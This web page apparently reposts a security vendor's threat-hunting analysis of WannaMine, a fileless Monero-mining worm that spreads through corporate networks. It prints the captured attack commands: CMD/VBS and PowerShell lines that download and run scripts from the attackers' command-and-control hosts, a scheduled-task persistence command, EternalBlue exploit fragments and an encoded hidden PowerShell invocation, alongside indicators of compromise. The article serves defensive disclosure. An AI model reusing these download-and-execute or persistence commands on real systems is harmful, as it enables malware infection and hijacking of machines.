<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Threat Hunting: A new fileless attack for crypto mining has been discovered.</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Fileless Monero WannaMine 

 Mining cryptocurrency (for example, Bitcoin, Ethereum or Monero) is no longer a wonder. Moreover, in recent years we have...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Threat Hunting: A new fileless attack for crypto mining has been discovered.</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/webt/dk/jt/ya/dkjtyatojyo-p8tw5wdrrow3vsi.jpeg"><br><br>  <b>Fileless Monero WannaMine</b> <br><br>  Mining cryptocurrency (for example, Bitcoin, Ethereum or Monero) is no longer a wonder.  Moreover, in recent years we have seen numerous attacks, whose main goal was to install mining software.  For example, do not forget that before the advent of <a href="https://habrahabr.ru/company/panda/blog/328882/">WannaCry,</a> we already saw hackers who used the NSA's <a href="https://habrahabr.ru/company/panda/blog/329044/">EternalBlue exploit</a> to penetrate companies and install this type of software on their victims' devices. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      It is safe to say that this is a thriving business, because  the complexity of the attacks continues to increase.  A few days ago, we discovered a new worm that uses hacking tools and scripts for distribution inside corporate networks, with the subsequent goal of mining Monero cryptocurrency on any network where it happened to ‚Äúgain a foothold‚Äù. <br><br>  When the specialists from the Threat Hunting service (in PandaLabs) discovered the following command, trying to execute inside one of the processes on the computer, the ‚Äúalarm‚Äù was immediately activated: <a name="habracut"></a><br><br>  <i>CMD / V: ON / C FOR / F ‚ÄúTOKENS = 2 DELIMS =. [‚Äù% I IN ('VER') DO (SET A =% I) &amp; IF! A: ~ -1! == 5 ( <a href="https://habrahabr.ru/users/echo/" class="user_link">ECHO</a> ON ERROR RESUME NEXT&gt;% WINDIR% \ 11.VBS&amp;@ECHO SET OX = CREATEOBJECT ^ (‚ÄúMSXML2.XMLHTTP‚Äù ^) &gt;&gt;% WINDIR% \ 11.VBS&amp;@ECHO OX.OPEN ‚ÄúGET‚Äù, ‚ÄùHTTP: // STAFFTEST. FIREWALL-GATEWAY.COM:8000/INFO.VBS said, FALSE&gt;&gt;%WINDIR%\11.VBS&amp;@ECHO OX.SETREQUESTHEADER ‚ÄúUSER-AGENT‚Äù, ‚Äú-‚Äú &gt;&gt;% WINDIR% \ 11.VBS&amp;@ECHO OX. SEND ^ (^) &gt;&gt;% WINDIR% \ 11.VBS&amp;@ECHO IF OX.STATUS = 200 THEN &gt;&gt;% WINDIR% \ 11.VBS&amp;@ECHO SET OAS = CREATEOBJECT ^ (‚ÄúADODB.STREAM‚Äù ^) &gt;&gt;% WINDIR% \ 11.VBS&amp;@ECHO OAS.OPEN &gt;&gt;% WINDIR% \ 11.VBS&amp;@ECHO OAS.TYPE = 1 &gt;&gt;% WINDIR% \ 11.VBS&amp;@ECHO OAS.WRITE OX.RESPONSEBODY &gt;&gt;% WINDIR% \ 11.VBS&amp;@ECHO OAS.SAVETOFILE ‚Äú% WINDIR% \ INFO.VBS‚Äù, 2 &gt;&gt;% WINDIR% \ 11.VBS&amp;@ECHO OAS.CLOSE &gt;&gt;% WINDIR% \ 11.VBS&amp;@ECHO END IF &gt;&gt;% WINDIR % \ 11.VBS&amp;@ECHO SET OS = CREATEOBJECT ^ (‚ÄúWSCRIPT.SHELL‚Äù ^) &gt;&gt;% WINDIR% \ 11.VBS&amp;@ECHO OS.EXEC ^ (‚ÄúCSCRIPT.EXE% WINDIR% \ INFO.VBS‚Äù ^) &gt;&gt;% WINDIR% \ 11.VBS &amp; CSCRIPT.EXE% WINDIR% \ 11.VBS) ELSE (POWERSHELL -NOP -NONI -W HIDDEN ‚ÄúIF ((GET-WMIOBJECT WIN32_OPERATIN</i>  <i>GSYSTEM) .OSARCHITECTURE.CONTAINS ('64 ')) {IEX (NEW-OBJECT NET.WEBCLIENT) .DOWNLOADSTRING (' HTTP://STAFFTEST.FIREWALL-GATEWAY.COM:8000/INFO6.PS1 ‚Ä≤)} ELSE {IEX ( NEW-OBJECTNET.WEBCLIENT) .DOWNLOADSTRING ('HTTP://STAFFTEST.FIREWALL-GATEWAY.COM:8000/INFO3.PS1 ‚Ä≤)} ‚Äú)</i> <br><br>  <b>Network Distribution Analysis</b> <br><br>  Shortly after the investigation began, we began to observe how the attackers, knowing that they were discovered, closed down the management servers (C &amp; C), but before that we were able to download the following files: <br><br>  <b>‚Ä¢ B6FCD1223719C8F6DAF4AB7FBEB9A20A PS1 ~ 4MB</b> <b><br></b>  <b>‚Ä¢ 27E4F61EE65668D4C9AB4D9BF5D0A9E7 VBS ~ 2MB</b> <br><br>  These are two very confusing scripts.  ‚ÄúInfo6.ps1‚Äù loads the Mimikatz module (dll) into memory (without touching the hard disk) so that you can steal the registration data that will later be used for horizontal movements in the internal (unprotected) networks. <br><br><img src="https://habrastorage.org/webt/vj/1s/gb/vj1sgb_tufkjzeiwihde5autudk.png"><br><br>  The script is implemented in <b>Powershell by the</b> well-known NetBios exploit, which is also known as <b>EternalBlue (MS17-010)</b> , so that it can start infecting other, not yet patched, Windows-based computers on the network. <br><br>  <i>$ TARGET_HAL_HEAP_ADDR_X64 = 0XFFFFFFFFFFD00010</i> <i><br></i>  <i>$ TARGET_HAL_HEAP_ADDR_X86 = 0XFFDFF000</i> <i><br></i>  <i>[BYTE []] $ FAKESRVNETBUFFERNSA = @ (0X00,0X10,0X01,0X00,0X00</i> <i><br></i>  <i>[BYTE []] $ FAKESRVNETBUFFERX64 = @ (0X00,0X10,0X01,0X00,0X00</i> <i><br></i>  <i>$ FAKESRVNETBUFFER = $ FAKESRVNETBUFFERNSA</i> <i><br></i>  <i>[BYTE []] $ FEALIST = [BYTE []] (0X00,0X00,0X01,0X00)</i> <i><br></i>  <i>$ FEALIST + = $ NTFEA [$ NTFEA_SIZE]</i> <i><br></i>  <i>$ FEALIST + = 0X00,0X00,0X8F, 0X00 + $ FAKESRVNETBUFFER</i> <i><br></i>  <i>$ FEALIST + = 0X12,0X34,0X78,0X56</i> <i><br></i>  <i>[BYTE []] $ FAKE_RECV_STRUCT = @ (0X00,0X00,0X00,0X00,0X00,0X00</i> <br><br>  At the same time, it uses <b>WMI</b> for remote command execution.  After the passwords were obtained for the computer, we see the ‚Äúwmiprvse.exe‚Äù process on this computer and the execution of a command line similar to the following: <br><br>  <i>POWERSHELL.EXE -NOP -NONI -W HIDDEN -E JABZAHQAAQBTAGUAPQBBAEUABGB2AGKACGBVAG4ABQBLAG4AD ...</i> <br><br>  If we decode ‚Äúbase 64‚Äù from this command line, we will get the script presented in Appendix I. <br><br>  <b>"Vitality" in the system</b> <br><br>  In one of the scripts, you can find the following command, which allows you to ensure the "survivability" of the threat in the system: <br><br>  <i>CMD / C ECHO POWERSHELL -NOP ‚Äú$ A = ([STRING] (GET-WMIOBJECT -NAMESPACE ROOT \ SUBSCRIPTION -CLASS __FILTERTOCONSUMERBINDING)); IF (($ A -EQ $ NULL) -OR (! ($ A.CONTAINS ( 'SCM EVENT FILTER')))) {IEX (NEW-OBJECT NET.WEBCLIENT) .DOWNLOADSTRING ('HTTP://STAFFTEST.SPDNS.EU:8000/MATE6.PS1')} ‚Äù&gt;% TEMP% \ Y1.BAT &amp;&amp; SCHTASKS / CREATE / RU SYSTEM / SC DAILY / TN YASTCAT / F / TR ‚Äú% TEMP% \ Y1.BAT‚Äù &amp;&amp; SCHTASKS / RUN / TN YASTCAT</i> <br><br>  As you can see, it programs the daily task of downloading and running the ‚Äúy1.bat‚Äù file. <br>  Please note that we do not have this file, because  management servers are currently offline. <br><br>  <b>Infection vector</b> <br><br>  We still do not know the original vector of infection, because  the networks in which the infection was detected and blocked were in the process of implementing the <a href="https://habrahabr.ru/company/panda/blog/325710/">Adaptive Defense</a> solution, and therefore at that time not the entire network was protected by this solution with advanced information security options.  For this reason, we were unable to determine who the ‚Äúpatient zero‚Äù was and how it was compromised. <br><br>  Among the possible options, this could be the download / execution of a file / trojan that first activated the worm, or it could be executed remotely with the help of some kind of exploit. <br><br>  <b>Management Servers</b> <br><br>  From the ‚Äúinfo6.ps1‚Äù script we were able to determine the data of the management servers. <br><br>  ‚Ä¢ spdns.eu <br>  ‚Ä¢ firewall-gateway.com <br>  ‚Ä¢ 179.67.243 <br>  ‚Ä¢ 184.48.95 <br><br>  Note that these servers stopped working on October 27, 2017. <br><br>  118.184.48.95 <br><br><img src="https://habrastorage.org/webt/jg/gk/lu/jggkluy_zv65bmgyg5l33chiu7o.png"><br><br>  107.179.67.243 <br><br><img src="https://habrastorage.org/webt/w1/wn/d1/w1wnd1dwtdm8fjocejxnggxcrhm.png"><br><br>  stafftest.spdns.eu <br><br><img src="https://habrastorage.org/webt/ng/lz/yc/nglzycfy6jpss23pcseotgpturi.png"><br><br>  stafftest.firewall-gateway.com <br><br><img src="https://habrastorage.org/webt/qf/n3/hg/qfn3hgxjcki5ylkfecrmznrwxvg.png"><br><br>  <b>Ioc</b> <br><br>  ‚Ä¢ exe (Monero, MD5 2ad7a39b17d08b3a685d36a23bf8d196) <br>  ‚Ä¢% windir% \ 11.vbs <br>  ‚Ä¢% windir% \ info.vbs <br>  ‚Ä¢% windir% \ info6.ps1 <br>  ‚Ä¢ dll <br>  ‚Ä¢ dll <br>  ‚Ä¢ Tarea programada ‚Äúyastcat‚Äù <br>  ‚Ä¢ spdns.eu <br>  ‚Ä¢ firewall-gateway.com <br>  ‚Ä¢ 179.67.243 <br>  ‚Ä¢ 184.48.95 <br><br>  <b>Conclusion</b> <br><br>  Once again, we are witnessing the professionalization of increasingly sophisticated attacks.  Even when it comes to just installing Monero miners (and we leave aside data theft, sabotage or espionage), attackers use advanced techniques and special tactics.  In fact, this is a <a href="http://club.cnews.ru/blogs/entry/mozhno_li_obnaruzhivat_bezfajlovye_ugrozy_">fileless attack</a> , with the result that most traditional antivirus solutions are barely able to detect it, much less react to it, and its victims can only wait for the generation of the necessary signatures (the fileless attack, though scripts and Monero client are loaded). <br><br>  But these signatures will relate only to a specific attack, and therefore even at its slightest change, they will be useless, not to mention that only the result of the attack (its final stage) is detected, but it does not show how the attack develops in the network. and how computers are compromised. <br><br>  Since the latest generation of security solutions not only classifies all the running processes on each computer, you can monitor the entire network in real time, which becomes an absolute necessity, because  hackers resort to harmless techniques in which they abuse quite legitimate system utilities. <br><br>  Watching all the processes, we can find the following events: <br><br>  ‚Ä¢ Process creation and remote code injection <br>  ‚Ä¢ Creating, modifying and opening files <br>  ‚Ä¢ Creating and modifying registry entries <br>  ‚Ä¢ Network events (communication aperture, file upload, etc.) <br>  ‚Ä¢ Administrative events (creation of users, etc.) </div><p>Source: <a href="https://habr.com/ru/post/341344/">https://habr.com/ru/post/341344/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../341332/index.html">An overview of tools for comparing data in PostgreSQL</a></li>
<li><a href="../341334/index.html">DotNext + SpbDotNet + MskDotNet</a></li>
<li><a href="../341336/index.html">Review of the reports of the conference Mobius 2017 Moscow - leap of faith in mobile technology</a></li>
<li><a href="../341338/index.html">Bitcoin and Security Software Wallets</a></li>
<li><a href="../341340/index.html">SAP HANA Support: New Features</a></li>
<li><a href="../341346/index.html">10 Lessons from the Quora Recommender System</a></li>
<li><a href="../341348/index.html">JavaScript, Node, Puppeteer: Chrome Automation and Web Scraping</a></li>
<li><a href="../341350/index.html">Typical beginner problems when working with Docker (video from the conference)</a></li>
<li><a href="../341352/index.html">FrontFest.Keynote - Blaine Cook (creator of OAuth) and Mateus Fernandez (CTO Zeit)</a></li>
<li><a href="../341354/index.html">Bayram Annakov (CEO App in the Air): How to do the right onboarding</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>